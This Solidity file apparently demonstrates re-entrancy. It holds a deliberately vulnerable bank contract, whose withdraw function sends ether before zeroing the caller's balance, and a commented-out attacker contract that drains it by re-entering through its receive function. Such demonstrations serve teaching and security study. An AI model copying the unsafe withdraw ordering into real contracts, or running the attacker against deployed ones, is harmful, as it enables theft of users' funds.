// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This is the vulnerable contract
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        
        // Vulnerable: Sending ETH before updating the balance
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// // This is the malicious contract that performs the re-entrancy attack
// contract Attacker {
//     VulnerableBank public vulnerableBank;
//     uint256 public attackAmount;
//     address public owner;

//     constructor(address _vulnerableBankAddress) {
//         vulnerableBank = VulnerableBank(_vulnerableBankAddress);
//         owner = msg.sender;
//     }

//     // Function to start the attack
//     function attack() external payable {
//         require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
//         attackAmount = msg.value;
        
//         // Initial deposit
//         vulnerableBank.deposit{value: attackAmount}();
        
//         // Start the withdrawal process
//         vulnerableBank.withdraw();
//     }

//     // Fallback function that gets called when receiving ETH
//     receive() external payable {
//         // If there's still ETH in the vulnerable contract, keep withdrawing
//         if (address(vulnerableBank).balance >= attackAmount) {
//             vulnerableBank.withdraw();
//         }
//     }

//     // Function to collect the stolen ETH
//     function collectStolenFunds() external {
//         require(msg.sender == owner, "Only owner can collect");
//         payable(owner).transfer(address(this).balance);
//     }
// }



